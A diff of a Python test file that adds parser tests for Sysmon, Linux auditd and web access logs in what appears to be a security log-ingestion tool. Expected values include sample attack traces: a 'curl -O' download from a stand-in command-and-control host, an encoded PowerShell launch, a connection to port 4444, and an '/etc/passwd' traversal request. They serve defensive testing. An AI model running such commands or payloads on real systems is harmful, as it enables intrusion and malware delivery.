@@ -6,9 +6,10 @@ from app.parsers import (aws_cloudtrail, azure_activity, cef, cisco_asa,
                          cisco_ios, crowdstrike_csv, crowdstrike_json,
                          entra_signin, fortinet_fortigate, gcp_audit,
                          generic_json, generic_syslog, github_audit,
-                         gitlab_audit, leef, m365_audit, meraki,
+                         gitlab_audit, leef, linux_auditd, m365_audit, meraki,
                          okta_system_log, paloalto_csv, paloalto_syslog,
-                         suricata_eve, windows_security, zeek_json, zeek_tsv)
+                         suricata_eve, sysmon, web_access, windows_security,
+                         zeek_json, zeek_tsv)
 
 SAMPLES = Path(__file__).resolve().parent.parent / "samples"
 
@@ -226,6 +227,65 @@ def test_windows_csv():
     assert e.user_name == "CORP\\jdoe"
     assert e.src_ip is None
     assert e.host_name == "FIN-WS-014.corp.local"
+
+
+def test_sysmon():
+    evs = list(sysmon.parse(_read("sysmon.json")))
+    assert len(evs) == 3
+    proc = evs[0]
+    assert proc.vendor == "microsoft" and proc.product == "sysmon"
+    assert proc.log_type == "process-create" and proc.action == "process-create"
+    assert proc.user_name == "CORP\\jdoe"
+    assert proc.host_name == "FIN-WS-014.corp.local"
+    assert proc.raw["Image"].endswith("powershell.exe")     # named field lifted onto raw
+    assert "-enc" in (proc.message or "")                    # CommandLine -> message
+    assert proc.event_time.year == 2026 and proc.event_time.hour == 10
+    net = evs[1]
+    assert net.log_type == "network-connect"
+    assert net.src_ip == "10.20.30.40" and net.dst_ip == "45.83.122.7"
+    assert net.dst_port == 4444 and net.protocol == "tcp"
+    assert "45.83.122.7:4444" in (net.message or "")
+    dns = evs[2]
+    assert dns.log_type == "dns-query"
+    assert "malware-c2.example.net" in (dns.message or "")
+    assert dns.raw["QueryName"] == "malware-c2.example.net"
+
+
+def test_linux_auditd():
+    evs = list(linux_auditd.parse(_read("linux_auditd.log")))
+    assert len(evs) == 3
+    sysc = evs[0]
+    assert sysc.vendor == "linux" and sysc.product == "auditd"
+    assert sysc.log_type == "syscall" and sysc.action == "process-create"   # execve syscall (59)
+    assert sysc.rule_name == "exec_watch"
+    assert sysc.user_name == "1000"                          # auid (SYSCALL has no acct)
+    assert sysc.event_time.year == 2026
+    execve = evs[1]
+    assert execve.log_type == "execve" and execve.action == "process-create"
+    assert execve.message == "curl -O http://malware-c2.example.net/x.sh"   # a0..aN reassembled
+    login = evs[2]
+    assert login.log_type == "user_login" and login.action == "failed-logon"
+    assert login.src_ip == "45.83.122.7" and login.user_name == "root"     # nested msg expanded
+    assert login.severity == "warning"
+
+
+def test_web_access():
+    evs = list(web_access.parse(_read("web_access.log")))
+    assert len(evs) == 3
+    trav = evs[0]
+    assert trav.vendor == "web" and trav.product == "access"
+    assert trav.action == "GET" and trav.rule_name == "HTTP 404"
+    assert trav.src_ip == "45.83.122.7" and trav.severity == "warning"
+    assert trav.bytes_total == 512 and trav.app == "http"
+    assert "/etc/passwd" in (trav.message or "")
+    assert trav.user_name is None
+    assert trav.event_time.year == 2026 and trav.event_time.hour == 10
+    post = evs[1]
+    assert post.action == "POST" and post.user_name == "jdoe" and post.severity is None
+    assert post.raw["referer"] == "https://app.example.com/"
+    err = evs[2]                                             # plain CLF (no combined fields)
+    assert err.severity == "error" and err.bytes_total == 0
+    assert err.raw["referer"] is None
 
 
 def test_generic_syslog():
@@ -566,6 +626,9 @@ def test_detect_format():
     assert detect_format("e.json", _read("crowdstrike_events.json")) == "crowdstrike_json"
     assert detect_format("c.log", _read("cef.log")) == "cef"
     assert detect_format("t.log", _read("leef.log")) == "leef"
+    assert detect_format("sm.json", _read("sysmon.json")) == "sysmon"
+    assert detect_format("au.log", _read("linux_auditd.log")) == "linux_auditd"
+    assert detect_format("acc.log", _read("web_access.log")) == "web_access"
     assert detect_format("f.log", _read("fortinet_fortigate.log")) == "fortinet_fortigate"
     assert detect_format("s.json", _read("suricata_eve.json")) == "suricata_eve"
     assert detect_format("w.json", _read("windows_security.json")) == "windows_security"
